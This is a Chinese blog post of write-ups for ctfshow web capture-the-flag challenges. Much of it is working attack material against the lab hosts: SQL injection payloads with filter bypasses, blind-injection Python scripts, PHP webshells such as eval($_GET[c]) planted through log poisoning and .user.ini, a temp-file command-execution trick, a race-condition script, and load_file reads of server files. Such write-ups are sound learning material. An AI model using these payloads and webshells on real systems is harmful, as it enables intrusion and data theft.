---
title: ctfshow-web题
description: 做一些题目练练手
pubDate: 2025-11-19
author: YU030X
tags:
  - ctf/ctfshow
  - web
cover: assets/律师3.jpg
draft: false
---
# CTFSHOW WEB题

## web签到题

F12看源代码，发现` Y3Rmc2hvd3tiMDUyYTQ0ZS04MWEyLTRhNWYtYjkyYS1lNDhjNzQ0YWJlOWR9` ,通过base64解码得到flag

## web2

简单的sql注入

## web3

php伪协议

```
POST /?url=php://input HTTP/1.1
Host: 54122502-42c8-42df-b6e7-418bdc5b8afe.challenge.ctf.show
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://54122502-42c8-42df-b6e7-418bdc5b8afe.challenge.ctf.show/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i
Connection: keep-alive
Content-Length: 35

<?php system("cat ctf_go_go_go");?>
```

## web4

[参考](https://blog.csdn.net/Myon5/article/details/133675614)


先`/?url=/etc/passwd`

尝试php伪协议，回显error

![image-20251117221048667](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117221048667.png)

提示信息：日志注入 文件包含

尝试读取日志：`?url=/var/log/nginx/access.log`

![](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223214263.png)

修改UA

![image-20251117223443953](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223443953.png)

登录蚁剑

![image-20251117223510010](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223510010.png)

![image-20251117223536153](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223536153.png)

## web5

php md5弱类型比较

ctype_alpha要求v1是纯字母

is_numeric要求v2是数字

 一些md5值以0e开头的字符串：

- QNKCDZO
- 240610708
- s878926199a
- s155964671a
- s21587387a

![image-20251118101053704](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118101053704.png)

## web6

先用`' or 1=1 #`测试，返回sql inject error

![image-20251118104035834](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104035834.png)

输入`' `发现空格被过滤

![image-20251118104221741](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104221741.png)

用/**/代替空格绕过

![image-20251118104957833](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104957833.png)

```
'or/**/1=1/**/order/**/by/**/3#

'or/**/1=1/**/union/**/select/**/1,2,3#

'or/**/1=1/**/union/**/select/**/1,database(),3#

'or/**/1=1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema='web2'#

'or/**/1=1/**/union/**/select/**/1,group_concat(flag),3/**/from/**/web2.flag#
```

## web7

```
?id=1/**/order/**/by/**/3#

?id=1/**/union/**/select/**/1,2,3#

?id=1/**/union/**/select/**/1,database(),3#

?id=1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='web7'),3#
//这里注入发现报错无回显

?id=1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema="web7"),3#
//换成双引号，查到表名

?id=1/**/union/**/select/**/1,group_concat(flag),3/**/from/**/web7.flag#
```

## web8

[参考](https://ctf.show/writeups/1549929)

过滤字符

- `and`
- `union`   // select查询的结果集无法在页面回显
- `or`
- 空格  // 可用/**/替代
- ......

脚本：

```
import requests

url = "http://xxxxxxxxxx.challenge.ctf.show/index.php?id=-1"
flag = ""

for num in range(1,60):
    l = 33
    r = 130
    mid = (l+r)>>1
    while l<r:
        # 数据库：web8
        # sql = "ascii(substr((select/**/database())/**/from/**/{}/**/for/**/1))>{}".format(num,mid)
        # 表：flag,page,user
        # sql = "ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/{}/**/for/**/1))>{}".format(num,mid)
        # 列：flag
        # sql = "ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666c6167)/**/from/**/{}/**/for/**/1))>{}".format(num,mid)
        # ctfshow{b54332e2-57d2-47c4-933a-d455e9b7e950}
        sql = "ascii(substr((select/**/flag/**/from/**/flag)/**/from/**/{}/**/for/**/1))>{}".format(num,mid)


        payload = url + "/**/||/**/" + sql

        # print(payload)

        res = requests.get(payload)
        
        if 'If' in res.text:
            l = mid + 1
        else:
            r = mid
        mid = (l+r)>>1
    if chr(mid)==" ":
        break
    flag += chr(mid)
    print(flag)
```

二分法:

```
import requests

url = "http://xxxxxxxxxxxxxxx.challenge.ctf.show/index.php?id=-1"
flag = ""


def check(mid, num):
    sql = "/**/||/**/ascii(substr((select/**/flag/**/from/**/flag)/**/from/**/{:d}/**/for/**/1))<={:d}".format(num,mid)
    payload = url + sql
    res = requests.get(payload)
    return 'If' in res.text

def bsearch(l, r, num):
    while l < r:
        mid = (l + r) >> 1
        if check(mid, num): r = mid    # check()判断mid是否满足性质
        else: l = mid + 1
    return l

for num in range(1, 60):
    l = 33
    r = 130
    res = bsearch(l, r, num)
    if chr(res) == "!":
        break
    flag += chr(res)
    print(f'第{num}次遍历结果:{flag}')
```

`substr()`：截取单个字符

`ascii()`：转换为 ASCII 码

## web9

dirsearch扫描

![image-20251118132236761](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118132236761.png)

打开robots.txt发现index.phps文件

![image-20251118132439610](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118132439610.png)

payload：`ffifdyop`


## web10

点取消得到源码

![image-20251118133800784](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118133800784.png)

由源码可知，`select、from、where、join、sleep、and、空格、union、,`被过滤了

payload：`'or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#`

## web11

password为空，把cookie删掉

![image-20251118213819661](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118213819661.png)

## web12

查看源码发现提示

![image-20251118220156878](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118220156878.png)

`?cmd=phpinfo();` 发现一堆函数被禁用

![image-20251118221516632](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118221516632.png)

`?cmd=print_r(glob('*'));`查看一下目录文件

`?cmd=highlight_file('903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php');`查看文件得到flag

## web13

通过`/upload.php.bak`看源码：

![image-20251119124310212](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119124310212.png)

发现文件名，大小，类型都做了限制

`.user.ini`：

在php中".user.ini"有如下解释：php会在每个目录下搜寻文件名，如果设定为空字符串则php不会搜寻，也就是在“.user.ini”中如果设置了文件名，那么任意一个页面都将该文件中的内容包含进去。

有两种方法：

auto_prepend_file:在页面顶部加载文件

auto_append_file:在页面底部加载文件



在.user.ini中填写`auto_prepend_file=a.txt`，上传

a.txt：

<?php eval($_GET[c]);?>

## web14

当c=3时返回here_1s_your_f1ag.php

`/here_1s_your_f1ag.php`进入登录界面

F12得到提示，过滤了information_schema.tables和information_schema.columns

![image-20251119212313395](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119212313395.png)

```
1/**/order/**/by/**/1#
//只有1个回显位置

-1/**/union/**/select/**/database()#
//web

-1/**/union/**/select/**/user()#
//root用户

-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema='web'#
//tables加上反引号绕过  
//content

-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name='content'#
//id,username,password

-1/**/union/**/select/**/group_concat(id,username,password)/**/from/**/content#
//1adminflag is not here!,2gtf1ywow,you can really dance,3Wowtell you a secret,secret has a secret...
```
`-1/**/union/**/select/**/load_file('/etc/nginx/nginx.conf')`
//看网站根目录，确定是/var/www/html

![image-20251119221110751](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119221110751.png)

 `-1/**/union/**/select/**/load_file('/var/www/html/secret.php')`

![image-20251119221233886](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119221233886.png)

最后看一下`/real_flag_is_here`得到flag



## 红包题第二弹

[参考1](https://ctf.show/writeups/1826091) [参考2](https://blog.csdn.net/Ethan552525/article/details/118459568)

源码

```
<?php
#error_reporting(0);
?>
<html lang="zh-CN">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0" />
    <title>ctf.show_红包题</title>
</head>
<body>
    <center>
    <h2>ctf.show_红包题</h2>
    <h4>where is the flag?</h4>
    </center>
    <!-- hint:?cmd= -->
    <?php
        if(isset($_GET['cmd'])){
            $cmd=$_GET['cmd'];
            highlight_file(__FILE__);
            if(preg_match("/[A-Za-oq-z0-9$]+/",$cmd)){
            
                die("cerror");
            }
            if(preg_match("/\~|\!|\@|\#|\%|\^|\&|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/",$cmd)){
                die("serror");
            }
            eval($cmd);
        
        }
    
     ?>

</body>
</html>

```

1. PHP上传机制：

   在php中，使用`Content-Type: multipart/form-data;`上传文件时，会将它保存在临时文件中，在php的配置中`upload_tmp_dir`参数为保存临时文件的路经，linux下面默认为`/tmp`。也就是说只要php接收上传请求，就会生成一个临时文件。如果具有上传功能，那么会将这个文件拷走储存。无论如何在执行结束后这个文件会被删除。并且php每次创建的临时文件名都有固定的格式，为phpXXXX.tmp（Windows中）、php**.tmp（Linux中）。

2. PHP中反引号作用：在php里面反引号里面的内容会被当做shell命令被执行。例如<?php echo`whoami`; ?> 会直接当作命令执行

3. `.`号相当于`source`命令，这个命令可以直接把文件内容当作命令执行，相当于把文件直接当作shell脚本执行

4. `<?=`相当于`<?php ehco`的简写版

5. `?`相当于字符的通配符，负责执行上传的临时文件，/??p/p?p??????匹配/tmp/phpxxxxxx

6. payload构造

   > /?cmd=?><?=`.+/??p/p?p??????`;

   `?>`：闭合前面的`<?php`命令

   `<?=`：相当于`<?php echo`

   反引号:执行命令

   `.`相当于`source`命令

   `+`：相当于空格

   `?`：文字通配符

7. 构造数据包

   ```shell
   POST /?cmd=?><?=`.+/??p/p?p??????`; HTTP/1.1
   Host: 6d22af06-d619-447d-a81b-425a21e9ccb5.challenge.ctf.show
   Cache-Control: max-age=0
   Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
   Sec-Ch-Ua-Mobile: ?0
   Sec-Ch-Ua-Platform: "Windows"
   Upgrade-Insecure-Requests: 1
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
   Sec-Fetch-Site: same-origin
   Sec-Fetch-Mode: navigate
   Sec-Fetch-User: ?1
   Sec-Fetch-Dest: document
   Referer: https://6d22af06-d619-447d-a81b-425a21e9ccb5.challenge.ctf.show/
   Accept-Encoding: gzip, deflate, br
   Accept-Language: zh-CN,zh;q=0.9
   Priority: u=0, i
   Connection: keep-alive
   Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888
   Content-Length: 243
   
   -----------------------------10242300956292313528205888
   Content-Disposition: form-data; name="fileUpload"; filename="1.txt"
   Content-Type: text/plain
    
   #! /bin/sh
   
   cat /flag.txt
   -----------------------------10242300956292313528205888--
   
   ```

   `Content-Type有两个值`:
   
   8. application/x-www-form-urlencoded(默认值) ：上传键值对
   9. multipart/form-data：上传文件
   
   `boundary=`:boundary定义边界符  **multipart/form-data 格式的分隔符**，核心作用是**区分上传的多个表单数据块（如文件、普通表单字段）**，避免不同数据内容混淆。
   
   文件开始标记：-----------------------------10242300956292313528205888
   文件结束标记：-----------------------------10242300956292313528205888--
   其中10242300956292313528205888是浏览器随机生成的，只要足够复杂就可以。
   
   `#! /bin/bash`#! /bin/sh 指定命令解释器，#!是一个特殊的表示符，其后，跟着解释此脚本的shell路径。bash只是shell的一种，还有很多其它shell，如：sh,csh,ksh,tcsh
   
   `cat /flag.txt`执行命令得到flag（先ls / 看看根目录，发现有flag.txt）

![image-20251118235305477](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235305477.png)

![image-20251118235342177](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235342177.png)



## 红包第六弹

dirsearch扫描目录

![image-20251119224834780](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119224834780.png)

`/web.zip`得到源码

![image-20251119225321166](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119225321166.png)

通过源码发现key.dat文件，尝试下载

参考脚本

```
import requests
import time
import hashlib
import threading

#这里为什么用分钟数生成：因为通过抓包发现改变分钟后token值才会变化
i=str(time.localtime().tm_min)
#生成token
m=hashlib.md5(i.encode()).hexdigest()
url="http://bdedf572-c2a4-41ff-966d-3cb094d5eabb.challenge.ctf.show/check.php?token={}&php://input".format(m)

def POST(data):
    try:
        r=requests.post(url,data=data)
        if "ctfshow" in r.text:
            print(r.text)
            pass
        # print(r.text)
        pass
    except Exception as e:
        print("somthing went wrong!")
        pass
    pass

with open('key.dat','rb') as t:
    data1=t.read()
    pass
for i in range(50):
    threading.Thread(target=POST,args=(data1,)).start()
for i in range(50):
    data2='emmmmm'
    threading.Thread(target=POST,args=(data2,)).start()
```

#### 攻击原理流程：

1. **第一次请求**（发送key.dat内容）：
   - 系统接收数据并保存为flag.dat
   - 此时：flag.dat内容 = key.dat内容
   - MD5相同，但SHA512也相同（因为内容相同）
   - 不满足"SHA512不同"的条件
2. **第二次请求**（发送简单字符串）：
   - 系统接收数据并**覆盖**flag.dat
   - 此时：flag.dat内容 = "emmmmm"
   - MD5不同（因为内容不同），不满足"MD5相同"条件

#### 关键：并发攻击的时间窗口

通过并发发送大量请求，攻击者利用了一个**时间窗口**：

1. 在极短时间内，第一个请求使flag.dat等于key.dat内容（满足MD5相同）
2. 紧接着，第二个请求使flag.dat变为"emmmmm"内容（MD5不同）
3. **但在验证过程中**，系统可能在不同时间点读取flag.dat：
   - 读取MD5时：flag.dat还是key.dat内容（MD5相同）
   - 读取SHA512时：flag.dat已经变成"emmmmm"内容（SHA512不同）

#### 为什么要发送50次？

#### 增加成功率的策略：

1. **时间窗口很小**：需要在系统处理的极短时间内完成两次文件写入
2. **并发增加机会**：50个线程并发执行，增加在正确时间窗口内命中的概率
3. **容错机制**：网络延迟、服务器处理速度等因素可能导致单次请求失败



## 红包题第七弹

![image-20251120214432028](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503982.png)

打开`/backdoor.php`

![image-20251120214616786](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503983.png)

`git-dumper https://17624533-04d3-43fa-af1d-8b99f4d0b05e.challenge.ctf.show/.git ./output`

![image-20251120220853221](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503984.png)

用蚁剑连接

![image-20251120221235310](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503985.png)

不能直接查看flag.txt

![image-20251120221335715](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503986.png)

POST传参`Letmein=highlight_file("../flag.txt");`

![image-20251120221905487](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503987.png)

## 萌新专属红包题

弱口令

![image-20251120222955518](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503988.png)

![image-20251120223027976](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503989.png)

![image-20251120223450461](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503990.png)

## CTFshow web1

注册登录

![image-20251120225416475](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120225424837.png)
